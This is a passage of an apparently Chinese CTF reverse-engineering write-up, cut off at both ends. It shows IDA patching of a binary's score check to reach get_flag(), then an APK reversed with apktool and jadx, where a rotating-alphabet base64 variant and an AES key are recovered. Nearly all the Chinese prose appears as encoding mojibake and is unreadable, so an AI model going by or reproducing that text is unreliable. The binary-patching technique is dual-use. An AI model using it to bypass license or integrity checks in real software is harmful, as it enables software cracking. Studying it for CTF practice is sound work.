å¾ˆå¤šï¼Œä¸æ˜¯ç®€å•çš„è§£å¯†</li><li>å…¶ä¸­showå‡½æ•°ä¸­æœ‰getflagï¼Œçœ‹èµ·æ¥æ˜¯patchäº†</li></ul><p>å…³é”®é€»è¾‘åœ¨<code>show()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">result = score;</span><br><span class="line"> <span class="keyword">if</span> ( score &gt; <span class="number">1145141918</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;\\t\\tWell Done! You got the flag!\\n\\t\\t&quot;</span>);</span><br><span class="line">   get_flag();</span><br><span class="line">   Sleep(<span class="number">0x9C4</span>u);</span><br><span class="line">   <span class="keyword">return</span> system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>æŠŠé‡Œé¢çš„114514é‚£æ®µæ”¹æˆ1çš„æ•°å­—å°±æ˜¯äº†ã€‚</p><ul><li>å…ˆæ‰“æ–­ç‚¹debugç„¶åæ‰¾åˆ°æ±‡ç¼–åœ°æ–¹</li><li>edité‡Œé¢é€‰æ‹©patch</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240227132325833.png" alt="image-20240227132325833" style="zoom:15%;" /><ul><li>å¯ä»¥æ”¹æœºå™¨ç å’Œæ±‡ç¼–éƒ½å¯ä»¥ï¼Œä½†æˆ‘è¿™æ±‡ç¼–æŠ¥é”™ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚æ„Ÿè§‰æ˜¯ä½æ•°é—®é¢˜ï¼Ÿ</li><li>ç”¨æœºå™¨ç æ”¹ï¼Œä½¿ç”¨å‡†æ¢ç½‘ç«™ï¼š<a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=48+3D+01+00+00+00&arch=x86-64&endianness=little&baddr=0x00000000&dis_with_addr=True&dis_with_raw=True&dis_with_ins=True#disassembly">https://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=48+3D+01+00+00+00&amp;arch=x86-64&amp;endianness=little&amp;baddr=0x00000000&amp;dis_with_addr=True&amp;dis_with_raw=True&amp;dis_with_ins=True#disassembly</a></li></ul><p>æœ€åä¸€æ­¥ï¼š<code>apply patches to input file</code></p><p>ç„¶ådebugeré‡æ–°å¯åŠ¨ï¼Œgetflagï¼</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240227132402713.png" alt="image-20240227132402713" style="zoom: 15%;" /><h4 id="å¤ç›˜-1"><a href="#å¤ç›˜-1" class="headerlink" title="å¤ç›˜"></a>å¤ç›˜</h4><ul><li>å­¦ä¼šä½¿ç”¨IDAè¿›è¡Œpatch</li><li>æ³¨æ„patchçš„æ—¶å€™æ ¼å¼ï¼Œæœ€å¥½è¿˜æ˜¯å°±ä½¿ç”¨å­—èŠ‚ç æ›¿æ¢å§</li><li>è®°å¾—&#96;&#96;apply patches to input file&#96;</li></ul><h3 id="ğŸ’¥-EASY-çˆ†äº†çˆ†äº†ï¼Œå’Œjavaçˆ†äº†"><a href="#ğŸ’¥-EASY-çˆ†äº†çˆ†äº†ï¼Œå’Œjavaçˆ†äº†" class="headerlink" title="ğŸ’¥[EASY]çˆ†äº†çˆ†äº†ï¼Œå’Œjavaçˆ†äº†"></a>ğŸ’¥[EASY]çˆ†äº†çˆ†äº†ï¼Œå’Œjavaçˆ†äº†</h3><h4 id="è€ƒç‚¹-2"><a href="#è€ƒç‚¹-2" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h4><ul><li>å®‰å“ apk é€†å‘</li><li>base64 åŠ å¯†</li></ul><h4 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><ul><li>è§£å‹ä¹‹åæ˜¯apkï¼Œæœäº†ä¸€ä¸‹Androidé€†å‘ï¼Œå¯ä»¥ä½¿ç”¨apktoolè§£å‹apkæ–‡ä»¶ï¼Œè·å–æºç </li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\app\\apktool&gt;java -jar apktool.jar d ezAndroid.apk -o ./demo</span><br></pre></td></tr></table></figure><p>è§£é‡Šï¼š</p><ul><li>original ç›®å½•ï¼šä¿å­˜äº†åŸå§‹çš„ AndroidManifest.xml å’Œç­¾åä¿¡æ¯</li><li>res ç›®å½•ï¼šåº”ç”¨ç¨‹åºçš„èµ„æºæ–‡ä»¶ç›®å½•ï¼ŒåŒ…å«äº†åº”ç”¨ç¨‹åºçš„å¸ƒå±€æ–‡ä»¶ã€å­—ç¬¦ä¸²èµ„æºã€å›¾ç‰‡èµ„æºç­‰ã€‚</li><li>smali ç›®å½•ï¼šåº”ç”¨ç¨‹åºçš„ Smali ä»£ç ç›®å½•ï¼ŒåŒ…å«äº†åº”ç”¨ç¨‹åºçš„æ‰€æœ‰ Smali ä»£ç æ–‡ä»¶ï¼ˆSmali å°±æ˜¯å­—èŠ‚ç ï¼‰</li><li>assets ç›®å½•ï¼šåº”ç”¨ç¨‹åºçš„ assets ç›®å½•ï¼ŒåŒ…å«äº†åº”ç”¨ç¨‹åºéœ€è¦ä½¿ç”¨çš„å„ç§èµ„æºæ–‡ä»¶ï¼Œä¾‹å¦‚éŸ³é¢‘ã€è§†é¢‘ã€å›¾ç‰‡ã€é…ç½®æ–‡ä»¶ç­‰ã€‚</li><li>lib ç›®å½•ï¼šåº”ç”¨ç¨‹åºçš„åº“ç›®å½•ï¼ŒåŒ…å«äº†åº”ç”¨ç¨‹åºéœ€è¦ä½¿ç”¨çš„åº“æ–‡ä»¶ï¼Œä¾‹å¦‚ so æ–‡ä»¶ç­‰ã€‚</li><li>AndroidManifest.xmlï¼šåº”ç”¨ç¨‹åºçš„æ¸…å•æ–‡ä»¶ï¼ŒåŒ…å«åº”ç”¨ç¨‹åºçš„åç§°ã€åŒ…åã€ç‰ˆæœ¬å·ã€æƒé™ç­‰ä¿¡æ¯ã€‚</li><li>apktool.ymlï¼šæ˜¯ APKTool å·¥å…·ä½¿ç”¨çš„é…ç½®æ–‡ä»¶ï¼Œç”¨äºæŒ‡å®šåç¼–è¯‘å’Œæ‰“åŒ… APK æ–‡ä»¶æ—¶çš„å„ç§å‚æ•°å’Œé€‰é¡¹ã€‚</li><li>åˆç”¨jadxåç¼–è¯‘äº†ä¸€ä¸‹</li></ul><p>å…ˆæŸ¥çœ‹<code>AndroidManifest.xml</code>  é‡Œé¢ä¿¡æ¯ï¼Œå‘ç°å¯ç–‘ä¿¡æ¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity android:exported=<span class="string">&quot;false&quot;</span> android:name=<span class="string">&quot;com.cnss.myapplication.o0o0o000o&quot;</span>/&gt;</span><br><span class="line">&lt;activity android:exported=<span class="string">&quot;false&quot;</span> android:name=<span class="string">&quot;com.cnss.myapplication.o0o0o0o0oo&quot;</span>/&gt;</span><br><span class="line">&lt;activity android:exported=<span class="string">&quot;true&quot;</span> android:name=<span class="string">&quot;com.cnss.myapplication.MainActivity&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>äºæ˜¯æ‰¾åˆ°è¿™ä¸‰ä¸ªæ–‡ä»¶ã€‚å…¶ä¸­<code>o0o0o000o</code> ä¸­åŒ…å«å¾ˆå¤šå¯ç–‘å‡½æ•°ï¼Œè¿™åº”è¯¥å°±æ˜¯è¿™é“é¢˜çš„å…³é”®äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">o0o0o000o</span> <span class="title">extends</span> <span class="title">AppCompatActivity</span> &#123;</span></span><br><span class="line">    private String Hint = <span class="string">&quot;key is a meaningful string.&quot;</span>;</span><br><span class="line">    private String i1 = <span class="string">&quot;SJNPhthkmYBHow5Y75wRDa==&quot;</span>;</span><br><span class="line">    private String i2 = <span class="string">&quot;RoBAU/g/jlxuy+Ns1YtA86==&quot;</span>;</span><br><span class="line">    Â·Â·Â·</span><br><span class="line">    private String i100 = <span class="string">&quot;cIU9ZQpjiINPy/kOw31OEa==&quot;</span>;</span><br><span class="line">    private <span class="type">char</span>[] str = &#123;<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    @Override <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    public <span class="type">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_o0o0o000o);</span><br><span class="line">        Button btn = (Button) findViewById(R.id.flagBtn);</span><br><span class="line">        final EditText flagInput = (EditText) findViewById(R.id.flagEdt);</span><br><span class="line">        final TextView flagOut = (TextView) findViewById(R.id.flagOUt);</span><br><span class="line">        btn.setOnClickListener(new View.OnClickListener() &#123; <span class="comment">// from class: com.cnss.myapplication.o0o0o000o.1</span></span><br><span class="line">            @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            public <span class="type">void</span> onClick(View view) &#123;</span><br><span class="line">                String s = o0o0o000o.this.decode(String.valueOf(flagInput.getText()));</span><br><span class="line">                try &#123;</span><br><span class="line">                    flagOut.setText(o0o0o000o.this.qvq(s));</span><br><span class="line">                &#125; catch (InvalidKeyException e) &#123;</span><br><span class="line">                    throw new RuntimeException(e);</span><br><span class="line">                &#125; catch (NoSuchAlgorithmException e2) &#123;</span><br><span class="line">                    throw new RuntimeException(e2);</span><br><span class="line">                &#125; catch (BadPaddingException e3) &#123;</span><br><span class="line">                    throw new RuntimeException(e3);</span><br><span class="line">                &#125; catch (IllegalBlockSizeException e4) &#123;</span><br><span class="line">                    throw new RuntimeException(e4);</span><br><span class="line">                &#125; catch (NoSuchPaddingException e5) &#123;</span><br><span class="line">                    throw new RuntimeException(e5);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String <span class="title function_">decode</span><span class="params">(String code)</span> &#123;</span><br><span class="line">        <span class="type">int</span> length = code.length();</span><br><span class="line">        <span class="keyword">if</span> (length == <span class="number">0</span> || length % <span class="number">4</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> null;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> endEqualNum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (code.endsWith(<span class="string">&quot;==&quot;</span>)) &#123;</span><br><span class="line">            endEqualNum = <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code.endsWith(<span class="string">&quot;=&quot;</span>)) &#123;</span><br><span class="line">            endEqualNum = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        code.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        StringBuilder sb = new StringBuilder(length);</span><br><span class="line">        <span class="type">int</span> blockNum = length / <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; blockNum; i++) &#123;</span><br><span class="line">            String afterDecode = decodeDetail(code.substring(i * <span class="number">4</span>, (i * <span class="number">4</span>) + <span class="number">4</span>));</span><br><span class="line">            sb.append(afterDecode);</span><br><span class="line">        &#125;</span><br><span class="line">        String result = sb.toString();</span><br><span class="line">        <span class="keyword">return</span> result.substring(<span class="number">0</span>, result.length() - endEqualNum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private String <span class="title function_">decodeDetail</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">int</span> len = str.length();</span><br><span class="line">        <span class="keyword">if</span> (len != <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> null;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> a1 = getIndex(str.charAt(<span class="number">0</span>));</span><br><span class="line">        qwq();</span><br><span class="line">        <span class="type">int</span> a2 = getIndex(str.charAt(<span class="number">1</span>));</span><br><span class="line">        qwq();</span><br><span class="line">        <span class="type">int</span> a3 = getIndex(str.charAt(<span class="number">2</span>));</span><br><span class="line">        qwq();</span><br><span class="line">        <span class="type">int</span> a4 = getIndex(str.charAt(<span class="number">3</span>));</span><br><span class="line">        qwq();</span><br><span class="line">        <span class="type">char</span>[] b = &#123;(<span class="type">char</span>) ((a1 &lt;&lt; <span class="number">2</span>) | ((a2 &amp; <span class="number">48</span>) &gt;&gt; <span class="number">4</span>)), (<span class="type">char</span>) (((a2 &amp; <span class="number">15</span>) &lt;&lt; <span class="number">4</span>) | ((a3 &amp; <span class="number">60</span>) &gt;&gt; <span class="number">2</span>)), (<span class="type">char</span>) (((a3 &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span>) | a4)&#125;;</span><br><span class="line">        <span class="keyword">return</span> String.copyValueOf(b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="type">int</span> <span class="title function_">getIndex</span><span class="params">(<span class="type">char</span> c)</span> &#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">char</span>[] cArr = this.str;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; cArr.length) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cArr[i] != c) &#123;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="type">void</span> <span class="title function_">qwq</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] tmp = new <span class="type">char</span>[<span class="number">64</span>];</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">char</span>[] cArr = this.str;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; cArr.length) &#123;</span><br><span class="line">                tmp[i] = cArr[(i + <span class="number">2</span>) % <span class="number">64</span>];</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                this.str = (<span class="type">char</span>[]) tmp.clone();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">     <span class="comment">/* JADX INFO: Access modifiers changed from: private */</span> </span><br><span class="line">    public String <span class="title function_">qvq</span><span class="params">(String keyStr)</span> throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException &#123;</span><br><span class="line">        byte[] eBytes = Base64.decode(<span class="string">&quot;11VaDwVeOwKvL6eqb2hsA2rb0wTbTRwsb7WirGpBW8s=&quot;</span>.getBytes(), <span class="number">0</span>);</span><br><span class="line">        SecretKeySpec mykey = new SecretKeySpec(keyStr.getBytes(), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        Cipher cipher = Cipher.getInstance(<span class="string">&quot;AES/ECB/PKCS5PADDING&quot;</span>);</span><br><span class="line">        cipher.init(<span class="number">2</span>, mykey);</span><br><span class="line">        <span class="keyword">return</span> new String(cipher.doFinal(eBytes));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    <span class="comment">//æ‰çœ‹åˆ°è¿˜æœ‰è¿™ä¸ª</span></span><br></pre></td></tr></table></figure><ul><li><p>ç”¨é›·ç”µæ¨¡æ‹Ÿå™¨æ‰“å¼€apkçœ‹çœ‹æ€ä¹ˆä¸ªäº‹å„¿</p><ul><li><p>æ‰“å¼€å°±è®©find the botton</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240227132837822.png" alt="image-20240227132837822" style="zoom:15%;" /></li><li><p>å‘ƒå‘ƒï¼Œå³ä¸‹è§’ä¸€ä¸ªå°ç»¿å—ã€‚çœŸæ— è¯­äº†</p></li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240227132901653.png" alt="image-20240227132901653" style="zoom:15%;" /></li><li><p>æƒ³åˆ° **<code>class** o0o0o0o0oo</code> é‡Œçš„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public <span class="type">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (o0o0o0o0oo.this.packetInput.getText().toString().equals(<span class="string">&quot;com.cnss.myapplication&quot;</span>)) &#123;</span><br><span class="line">      Toast.makeText(o0o0o0o0oo.this, <span class="string">&quot;Go to the final page&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">      o0o0o0o0oo.this.startActivity(new Intent(o0o0o0o0oo.this, o0o0o000o.class));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  Toast.makeText(o0o0o0o0oo.this, <span class="string">&quot;Plz find the packet name&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æ‰€ä»¥æ˜¯ï¼š<code>com.cnss.myapplication</code></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240227132926272.png" alt="image-20240227132926272" style="zoom:15%;" /></li><li><p>æœ€åä¸€æ­¥äº†ï¼Œè‚¯å®šå°±æ˜¯o0o0o000oé‡Œé¢é‚£ä¸²ä¸€çœ¼base64åŠ å¯†</p></li></ul><p>onclické€»è¾‘ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> o0o0o000o.<span class="built_in">this</span>.decode(String.valueOf(flagInput.getText()));</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    flagOut.setText(o0o0o000o.<span class="built_in">this</span>.qvq(s));</span><br><span class="line">&#125; <span class="keyword">catch</span></span><br><span class="line"><span class="title function_">decode</span><span class="params">(flagInput.getText()</span>)</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">decode</span><span class="params">(String code)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> code.length();</span><br><span class="line">        <span class="keyword">if</span> (length == <span class="number">0</span> || length % <span class="number">4</span> != <span class="number">0</span>) &#123;     <span class="comment">//flagä¸º4çš„å€æ•°</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">endEqualNum</span> <span class="operator">=</span> <span class="number">0</span>;      </span><br><span class="line">        <span class="keyword">if</span> (code.endsWith(<span class="string">&quot;==&quot;</span>)) &#123;</span><br><span class="line">            endEqualNum = <span class="number">2</span>;          </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code.endsWith(<span class="string">&quot;=&quot;</span>)) &#123;</span><br><span class="line">            endEqualNum = <span class="number">1</span>;</span><br><span class="line">        &#125;                                           <span class="comment">//è®¡ç®—&#x27;=&#x27;çš„æ•°é‡</span></span><br><span class="line">        code.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(length);</span><br><span class="line">        <span class="type">int</span> <span class="variable">blockNum</span> <span class="operator">=</span> length / <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; blockNum; i++) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">afterDecode</span> <span class="operator">=</span> decodeDetail(code.substring(i * <span class="number">4</span>, (i * <span class="number">4</span>) + <span class="number">4</span>));</span><br><span class="line">            sb.append(afterDecode);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> sb.toString();</span><br><span class="line">        <span class="keyword">return</span> result.substring(<span class="number">0</span>, result.length() - endEqualNum);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>decode æ˜¯ base64 çš„è§£ç ï¼Œdecode_detail é€»è¾‘å°±æ˜¯å››ä¸ªå­—ç¬¦ï¼Œåˆ†åˆ«è§£å¯†ç„¶åè½¬æˆä¸‰ä¸ªæ˜æ–‡å­—ç¬¦ã€‚ä½†æ˜¯æ¯è§£å¯†ä¸€æ¬¡å°±æ‰§è¡Œ qwq()</li><li>qwq() è¿›è¡Œäº† base64 å­—ç¬¦è¡¨çš„å³ç§»ï¼Œç›¸å½“äºæ¯æ¬¡è§£å¯†å­—ç¬¦è¡¨éƒ½ä¸åŒã€‚</li><li>ç„¶åæ€»é€»è¾‘æ˜¯ï¼šå¯¹è¾“å…¥çš„å€¼è¿›è¡Œdecode(base64å˜ç§)ï¼Œç„¶åæ”¾è¿›qvq ä½œä¸º key è¿›è¡Œaes è§£å¯†ã€‚</li><li>æç¤º key is a meaningful str</li><li>å› æ­¤ï¼Œæ€è·¯å°±æ˜¯æŠŠä¸Šé¢é‚£äº›ä¸²éƒ½æ‹¿å»è§£å¯†ã€‚å› ä¸ºé‚£äº›ä¸²ï¼šå»æ‰æœ«å°¾ä¸¤ä¸ª&#x3D;ï¼Œå†å°†ä¸­é—´çš„&#x3D;æ›¿æ¢ä¸º0ï¼Œå°±æ˜¯æ ‡å‡†çš„å¯ä»¥è§£å¯†çš„ base64 å¯†æ–‡ã€‚å› æ­¤ä¸ç®¡æ€ä¹ˆæ ·éƒ½è¦å…ˆæŠŠé‚£100ä¸ªè§£å¯†äº†</li><li>ç›´æ¥æŠ„ä»–çš„é€»è¾‘ç”¨ java è·‘</li><li>è§£å¯†å‡ºæ¥å‘ç°ä¸€ä¸ª meaningful str</li><li>ç›´æ¥ä¼ è¿› app ä¸­</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 